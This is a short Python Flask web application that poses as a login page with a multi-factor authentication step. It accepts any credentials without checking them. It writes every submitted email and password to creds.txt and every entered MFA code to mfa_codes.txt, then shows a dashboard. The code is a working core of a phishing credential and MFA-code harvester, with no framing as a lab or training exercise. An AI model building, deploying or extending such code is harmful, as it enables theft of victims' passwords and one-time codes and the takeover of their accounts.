
from flask import Flask, request, redirect, render_template, make_response, url_for
import uuid

app = Flask(__name__)


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        with open("creds.txt", "a") as f:
            f.write(f"{email}:{password}\n")

        
        session_token = str(uuid.uuid4())

        response = make_response(redirect('/mfa'))
        response.set_cookie('session_token', session_token)
        response.set_cookie('user_email', email) 

        with open("sessions.txt", "a") as f:
            f.write(f"{email}:{session_token}\n")

        return response
        
    return render_template("login_page.html")

@app.route('/mfa', methods=['GET', 'POST'])
def mfa():
    if request.method == 'POST':
        code = request.form.get('code')

        with open("mfa_codes.txt", "a") as f:
            f.write(f"Entered MFA code: {code}\n")

        if not code or not code.isdigit() or len(code) != 6:
            return "Invalid code", 401

        
        return redirect('/dashboard')

    return render_template("mfa_page.html")

@app.route('/dashboard')
def dashboard():
    session_token = request.cookies.get('session_token')
    user_email = None

    if not session_token:
        return redirect('/login')
    
   
    try:
        with open("sessions.txt", "r") as f:
            for line in f:
                parts = line.strip().split(":")
                if len(parts) != 2:
                    continue
                email, token = parts

                if token == session_token:
                    user_email = email
                    break


    except FileNotFoundError:
        return redirect('/login')

    if user_email:
        return render_template("dashboard_page.html", email=user_email)
    

    return redirect('/login')

if __name__ == '__main__':
    app.run(debug=True, port=8080)
